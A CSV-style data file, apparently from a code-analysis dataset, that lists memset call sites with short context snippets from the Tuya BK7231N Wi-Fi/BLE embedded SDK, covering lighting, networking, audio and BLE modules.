2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&ctrl_data_temp, 0, SIZEOF(light_ctrl_data_t));",120,1,"    PR_DEBUG(""hsv %d %d %d"", hue, sat, val);

    memset(&ctrl_data_temp, 0, SIZEOF(light_ctrl_data_t));

    if ((WHITE_MODE == sg_light_ctrl_data.mode) || (COLOR_MODE == sg_light_ctrl_data.mode)) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&save_data, 0, SIZEOF(light_app_data_flash_t));",120,1,"    }

    memset(&save_data, 0, SIZEOF(light_app_data_flash_t));

    save_data.power = sg_light_ctrl_data.switch_status;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&ctrl_data, 0, SIZEOF(bright_data_t));",120,1,"    PR_DEBUG(""normal display...."");
    
    memset(&ctrl_data, 0, SIZEOF(bright_data_t));

    //stop all shade process!
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_handle.target_val, 0, SIZEOF(bright_data_t));",120,1,"                s_stand_index = 0;

                memset(&sg_light_ctrl_handle.target_val, 0, SIZEOF(bright_data_t));

                _light_ctrl_def_color_bright_calculate(sg_light_cfg_data.net_color, sg_light_cfg_data.def_bright, sg_light_cfg_data.net_temper, &sg_light_ctrl_handle.target_val);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_set_color\light_set_color.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_set_color\light_set_color.c,"memset(&pwm_color, 0, SIZEOF(user_pwm_color_t));",120,1,"    
            user_pwm_color_t pwm_color; 
            memset(&pwm_color, 0, SIZEOF(user_pwm_color_t));   

            //pwm color range 0 ~ 1000
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_soc\soc_pwm.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_soc\soc_pwm.c,"memset(sg_pwm_list, 0, channel_num);",120,1,"    }

    memset(sg_pwm_list, 0, channel_num); 

    //æ£€æŸ¥é€šé“æ•°
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_soc\soc_timer.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_soc\soc_timer.c,"memset(sg_timers, 0, sizeof(sg_timers));",120,1,"    if (!sg_timers_flag) {
        //sg_timersåˆå§‹åŒ–
        memset(sg_timers, 0, sizeof(sg_timers));
        sg_timers_flag = TRUE;
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_system\light_init.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_system\light_init.c,"memset(&device_cfg, 0, SIZEOF(device_cfg));",120,1,"    device_config_t device_cfg;

    memset(&device_cfg, 0, SIZEOF(device_cfg));

#if (DEMO_LIGHT_WAY == CMOD_C)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_system\light_init.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_system\light_init.c,"memset(device_cfg.wfcfg, 0, SIZEOF(device_cfg.wfcfg));",120,1,"    device_cfg.colormin = 100;                      // don't modify!
    
    memset(device_cfg.wfcfg, 0, SIZEOF(device_cfg.wfcfg));
    memcpy(device_cfg.wfcfg, ""spcl"", strlen(""spcl""));                      //GWCM_SPCL_MODE
    device_cfg.remdmode = 0;                        //blink mode
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,"akconf->memset(&_akcontext->data, 0, sizeof(union airkiss_data));",120,1,"static void airkiss_resest_data(void) 
{ 
    akconf->memset(&_akcontext->data, 0, sizeof(union airkiss_data)); 
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,"akconf->memset(_akcontext, 0, sizeof(_airkiss_local_context));",120,1,"
    _akcontext = (_airkiss_local_context*)context;
    akconf->memset(_akcontext, 0, sizeof(_airkiss_local_context)); 
    
    _akcontext->airkiss_state = AIRKISS_STATE_IDLE; 
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss.c,"memset(_akcontext , 0, sizeof(_airkiss_local_context));",120,1,"int airkiss_change_channel(airkiss_context_t* context) 
{ 
    memset(_akcontext , 0, sizeof(_airkiss_local_context)); 
    _akcontext->airkiss_state = AIRKISS_STATE_IDLE; 
    return 0; 
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,"os_memset(&g_chans, 0, sizeof(airkiss_channel_t));",120,1,"{
    int i;
    os_memset(&g_chans, 0, sizeof(airkiss_channel_t));
    os_memset(&g_macs, 0, sizeof(airkiss_mac_t));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,"os_memset(&g_macs, 0, sizeof(airkiss_mac_t));",120,1,"    int i;
    os_memset(&g_chans, 0, sizeof(airkiss_channel_t));
    os_memset(&g_macs, 0, sizeof(airkiss_mac_t));

    g_chans.all_chan_nums = MAX_CHANNELS - 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\airkiss\airkiss_main.c,"os_memset(&remote_skt, 0, sizeof(struct sockaddr_in));",120,1,"		return;
	}
    os_memset(&remote_skt, 0, sizeof(struct sockaddr_in));
    remote_skt.sin_family = AF_INET;
    remote_skt.sin_addr.s_addr = INADDR_BROADCAST;//INADDR_ANY;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"memset(f, 0, sizeof(sfifo_t));",120,1,"static int sfifo_init(sfifo_t *f, int size)
{
    memset(f, 0, sizeof(sfifo_t));

    if(size > SFIFO_MAX_BUFFER_SIZE)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"memset(fsm->datafs, 0, sizeof(struct ftpd_datastate));",120,1,"        return 1;
    }
    memset(fsm->datafs, 0, sizeof(struct ftpd_datastate));
    fsm->datafs->msgfs = fsm;
    fsm->datafs->msgpcb = pcb;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"memset(fsm, 0, sizeof(struct ftpd_msgstate));",120,1,"        return ERR_MEM;
    }
    memset(fsm, 0, sizeof(struct ftpd_msgstate));

    /* Initialize the structure. */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,"os_memset(ascii, 0, sizeof(ascii));",120,1,"
            written = 0;
            os_memset(ascii, 0, sizeof(ascii));
        }
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,"os_memset(tmpbuf, 0, sizeof(logcb.text_buf));",120,1,"    LITE_printf(LOG_PREFIX_FMT, lvl_names[level], f, l);

    os_memset(tmpbuf, 0, sizeof(logcb.text_buf));
    va_start(ap, fmt);
    o += vsnprintf(o, LOG_MSG_MAXLEN + 1, fmt, ap);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,"os_memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);",120,1,"
    /* Send request */
    os_memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    os_memset(buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    len = 0; /* Reset send buffer */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,"os_memset(buf, 0, HTTPCLIENT_SEND_BUF_SIZE);",120,1,"    /* Send request */
    os_memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    os_memset(buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    len = 0; /* Reset send buffer */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_net.c,"os_memset(&hints, 0, sizeof(hints));",120,1,"    char service[6];

    os_memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; //only IPv4
    hints.ai_socktype = SOCK_STREAM;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\led\app_led.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\led\app_led.c,"os_memset(&ledctr, 0, sizeof(LED_ST));",120,1,"    OSStatus err;

    os_memset(&ledctr, 0, sizeof(LED_ST));
    ledctr.state = STA_NONE;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,"os_memset(&general, 0, sizeof(general_param_t));",120,1,"    u8 *mac;
    
    os_memset(&general, 0, sizeof(general_param_t));
    os_memset(&ap_info, 0, sizeof(ap_param_t)); 
    os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_st));  
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,"os_memset(&ap_info, 0, sizeof(ap_param_t));",120,1,"    
    os_memset(&general, 0, sizeof(general_param_t));
    os_memset(&ap_info, 0, sizeof(ap_param_t)); 
    os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_st));  
    
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,"os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_st));",120,1,"    os_memset(&general, 0, sizeof(general_param_t));
    os_memset(&ap_info, 0, sizeof(ap_param_t)); 
    os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_st));  
    
    if(app_drone_get_general_paramters(&general) == -1) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\net_work\app_drone.c,"os_memset(&ap_info.key, 0, 65);",120,1,"        os_memcpy(ap_info.ssid.array, APP_DRONE_DEF_SSID, os_strlen(APP_DRONE_DEF_SSID));
        ap_info.key_len = 0;
        os_memset(&ap_info.key, 0, 65);   
    } else {
        // first load mac addr from flash
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"memset(pkt_buf, 0, 700);",120,1,"    volatile uint16_t *s;

    memset(pkt_buf, 0, 700);
    pkt = pkt_buf;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"os_memset(&server_addr, 0, sizeof(server_addr));",120,1,"        goto exit;
    }
    os_memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = tftp_s_addr;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset(temp_ssid, 0, 33);",120,1,"		{
			char temp_ssid[33];
			os_memset(temp_ssid, 0, 33);
			os_memcpy(temp_ssid, apList.ApList[i].ssid, 32);
			bk_printf(""    %s, RSSI=%d\r\n"", temp_ssid, apList.ApList[i].ApPower);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset( &wNetConfigAdv, 0x0, sizeof(network_InitTypeDef_adv_st) );",120,1,"	network_InitTypeDef_adv_st	wNetConfigAdv;

	os_memset( &wNetConfigAdv, 0x0, sizeof(network_InitTypeDef_adv_st) );
	
	os_strcpy((char*)wNetConfigAdv.ap_info.ssid, oob_ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset( &networkadv_cfg, 0x0, sizeof(network_InitTypeDef_adv_st) );",120,1,"            network_InitTypeDef_adv_st	networkadv_cfg;

        	os_memset( &networkadv_cfg, 0x0, sizeof(network_InitTypeDef_adv_st) );
        	
        	os_strcpy((char*)networkadv_cfg.ap_info.ssid, cfg->ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset(&network_cfg, 0x0, sizeof(network_InitTypeDef_st));",120,1,"            return;
        } else {
        	os_memset(&network_cfg, 0x0, sizeof(network_InitTypeDef_st));

        	os_strcpy((char *)network_cfg.wifi_ssid, cfg->ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset(&linkStatus, 0x0, sizeof(LinkStatusTypeDef));",120,1,"    if( sta_ip_is_start() )
    {
    	os_memset(&linkStatus, 0x0, sizeof(LinkStatusTypeDef));
    	bk_wlan_get_link_status(&linkStatus);
        os_memcpy(ssid, linkStatus.ssid, 32);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset(&ap_info, 0x0, sizeof(network_InitTypeDef_ap_st));",120,1,"    if( uap_ip_is_start() )
    {
    	os_memset(&ap_info, 0x0, sizeof(network_InitTypeDef_ap_st));
    	bk_wlan_ap_para_info_get(&ap_info);
        os_memcpy(ssid, ap_info.wifi_ssid, 32);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\demo\ieee802_11_demo.c,"os_memset(&ipStatus, 0x0, sizeof(IPStatusTypedef));",120,1,"    IPStatusTypedef ipStatus;

	os_memset(&ipStatus, 0x0, sizeof(IPStatusTypedef));
	bk_wlan_get_ip_status(&ipStatus, STATION);
    
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_adc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_adc.c,"os_memset(&cfg, 0, sizeof(GDMACFG_TPYES_ST));",120,1,"        return;
    
    os_memset(&cfg, 0, sizeof(GDMACFG_TPYES_ST));
    
    cfg.dstdat_width = 32;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_adc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_adc.c,"os_memset(&aud_adc, 0, sizeof(AUD_ADC_DESC_ST));",120,1,"    audio_adc_close_analog_regs();

    os_memset(&aud_adc, 0, sizeof(AUD_ADC_DESC_ST));
    aud_adc.status = AUD_ADC_STA_CLOSED;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_dac.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\audio\audio_dac.c,"os_memset(&aud_dac, 0, sizeof(AUD_DAC_DESC_ST));",120,1,"    audio_dac_close_analog_regs();

    os_memset(&aud_dac, 0, sizeof(AUD_DAC_DESC_ST));
    aud_dac.status = AUD_DAC_STA_CLOSED;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble.c,"memset(&ble_cfg, 0, sizeof(BLE_CFG_ST));",120,1,"    ble_stop();

    memset(&ble_cfg, 0, sizeof(BLE_CFG_ST));
    
    wifi_get_mac_address((char *)&ble_cfg.mac, 2);  // get sta's mac addr 
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_lib\ip\ble\ll\src\llm\llm_util.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_lib\ip\ble\ll\src\llm\llm_util.h,"memset(payload, pattern, payload_len);",120,1,"    }
    // fulfill the payload
    memset(payload, pattern, payload_len);

}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_lib\ip\ble\ll\src\llm\llm_util.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_lib\ip\ble\ll\src\llm\llm_util.h,"memset(llm_le_env.advertising_params, 0, sizeof(struct advertising_pdu_params));",120,1,"    llm_le_env.advertising_params = (struct advertising_pdu_params *)kernel_malloc(sizeof(struct advertising_pdu_params),
                                    KERNEL_MEM_ENV);
    memset(llm_le_env.advertising_params, 0, sizeof(struct advertising_pdu_params));

    // Disable filtering
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\ip\ble\profiles\comm\src\comm.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\ip\ble\profiles\comm\src\comm.c,"memset(ble_env, 0 , sizeof(struct bk_ble_env_tag));",120,1,"    //-------------------- allocate memory required for the profile  ---------------------
    ble_env = (struct bk_ble_env_tag* ) kernel_malloc(sizeof(struct bk_ble_env_tag), KERNEL_MEM_ATT_DB);
    memset(ble_env, 0 , sizeof(struct bk_ble_env_tag));
   
    // Service content flag
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_ble.c,"memset(&app_env, 0, sizeof(app_env));",120,1,"
    // Reset the application manager environment
    memset(&app_env, 0, sizeof(app_env));

    // Create APP task
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_sec.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_sec.c,"memset(cfm->data.tk.key, 0, KEY_LEN);",120,1,"
            // Set the TK value
            memset(cfm->data.tk.key, 0, KEY_LEN);

            cfm->data.tk.key[0] = (uint8_t)((pin_code & 0x000000FF) >>  0);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_task.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\app\src\app_task.c,"memset(buf, 0x0, 8);",120,1,"#if 0
	uint8_t buf[8];
	memset(buf, 0x0, 8);
	
	switch(send_count)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\common\src\RomCallFlash.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\common\src\RomCallFlash.c,"memset(api,0,sizeof(struct rom_env_tag));",120,1,"void rom_env_init(struct rom_env_tag *api)
{
	memset(api,0,sizeof(struct rom_env_tag));
	api->prf_get_id_from_task = prf_get_id_from_task;
	api->prf_get_task_from_id = prf_get_task_from_id;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,"memset(tmpResult.num, 0, sizeof(tmpResult.num));",120,1,"        u_int32 *result = tmpResult.num;
#endif // (ECC_MULT_ALGO_TYPE == 16)
        memset(tmpResult.num, 0, sizeof(tmpResult.num));
        tmpResult.len = 0;
        tmpResult.sign = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,"memset(BigHexResult->num, 0, sizeof(BigHexResult->num));",120,1,"__RAM_ECDH __INLINE__ void initBigNumber256(bigHex256 *BigHexResult)
{
    memset(BigHexResult->num, 0, sizeof(BigHexResult->num));

    BigHexResult->len = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\ecc_p256\src\ecc_p256.c,"memset(BigHex_1.num, 0, sizeof(BigHex_1.num) );",120,1,"    BigHex_1.len = 0x01;
    BigHex_1.sign = 0; // Positive Number
    memset(BigHex_1.num, 0, sizeof(BigHex_1.num) );
    BigHex_1.num[HIGHEST_INDEX_BIG_HEX256] = 0x01;
    copyBigHex256(&source->x, &destination->x);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\rwip\src\rwip.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\modules\rwip\src\rwip.c,"memset(&rwip_env, 0, sizeof(rwip_env));",120,1,"    #if (DEEP_SLEEP)
    // Reset RW environment
    memset(&rwip_env, 0, sizeof(rwip_env));
    #endif //DEEPSLEEP
    #if (KERNEL_SUPPORT)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\driver\reg\ble_reg_access.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\driver\reg\ble_reg_access.h,"memset((void *)(em_addr + EM_BASE_ADDR), value, len);",120,1,"__INLINE void em_set(int value, uint16_t em_addr, uint16_t len)
{
    memset((void *)(em_addr + EM_BASE_ADDR), value, len);
}

"
